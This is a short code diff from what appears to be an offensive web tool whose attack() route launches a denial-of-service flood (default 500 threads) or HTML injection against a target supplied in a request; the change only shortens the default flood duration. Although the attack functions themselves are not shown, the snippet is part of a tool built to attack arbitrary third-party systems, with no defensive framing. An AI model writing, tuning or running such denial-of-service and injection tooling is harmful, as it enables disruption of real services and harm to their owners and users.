@@ -73,7 +73,7 @@ def attack():
             data = request.json
             target_url = data.get("target_url")
             num_threads = data.get("num_threads", 500)
-            duration = data.get("duration", 20)
+            duration = data.get("duration", 5)
             result_message = asyncio.run(ddos_attack(target_ip, num_threads, duration))
         elif attack_type == "htmlinjection":
             result_message = html_injection(target_ip) 
